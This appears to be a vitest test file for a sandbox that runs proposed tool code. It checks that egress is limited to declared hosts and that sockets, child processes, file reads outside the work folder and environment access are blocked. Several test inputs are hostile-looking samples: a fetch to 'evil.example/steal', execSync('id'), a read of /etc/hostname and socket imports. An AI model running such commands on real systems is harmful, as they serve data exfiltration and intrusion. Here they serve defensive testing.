import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { egressFetch } from "../src/connectors/http.ts";
import { runSandboxed, SandboxError } from "../src/core/sandbox.ts";
import { tempDataDir } from "./helpers.ts";

const policy = async () => ({ modelProviders: [], channels: [], connectors: ["tool:meteo"] });
const fakeApi = (async (input: string | URL | Request) => Response.json({ url: String(input), temp: 18 })) as typeof fetch;

function run(code: string, extra: Partial<Parameters<typeof runSandboxed>[0]> = {}) {
	const dir = tempDataDir();
	return runSandboxed({
		code,
		args: { x: 21 },
		workDir: join(dir, "tools", "meteo"),
		runnerDir: join(dir, "runner"),
		fetch: egressFetch("tool:meteo", ["api.meteo.example"], policy, fakeApi),
		timeoutMs: 10_000,
		...extra,
	});
}

describe("sandbox for tools proposti", () => {
	it("runs the default export with the arguments; objects come back as JSON", async () => {
		expect(await run("export default async (a) => a.x * 2")).toBe("42");
		expect(await run("export default async (a) => ({ doubled: a.x * 2 })")).toBe('{"doubled":42}');
	});

	it("reaches only the declared hosts, through the egress-guarded fetch", async () => {
		expect(await run('export default async () => (await (await fetch("https://api.meteo.example/roma")).json()).temp')).toBe("18");
		await expect(run('export default async () => (await fetch("https://evil.example/steal")).status')).rejects.toThrow(/Egress denied/);
	});

	it("cannot open sockets, spawn processes, read outside its folder or see the environment", async () => {
		process.env.ANNIE_SECRET_PROBE = "leak";
		await expect(run('import net from "node:net"; export default async () => "x"')).rejects.toThrow("Module not allowed in the sandbox: node:net");
		await expect(run('export default async () => (await import("node:https")).request')).rejects.toThrow("not allowed");
		await expect(run('export default async () => process.getBuiltinModule("net").connect')).rejects.toThrow("not allowed");
		await expect(run('import { execSync } from "node:child_process"; export default async () => execSync("id")')).rejects.toThrow("not allowed");
		await expect(run('import { readFileSync } from "node:fs"; export default async () => readFileSync("/etc/hostname", "utf8")')).rejects.toThrow(/restricted|allow-fs-read/);
		expect(await run("export default async () => Object.keys(process.env).length")).toBe("0");
		expect(await run('import { writeFileSync, readFileSync } from "node:fs"; import { join } from "node:path"; export default async (_a, { workDir }) => { writeFileSync(join(workDir, "cache.txt"), "ok"); return readFileSync(join(workDir, "cache.txt"), "utf8"); }')).toBe("ok");
	});

	it("is stopped when it runs too long", async () => {
		await expect(run("export default async () => new Promise(() => {})", { timeoutMs: 500 })).rejects.toThrow(SandboxError);
	});
});
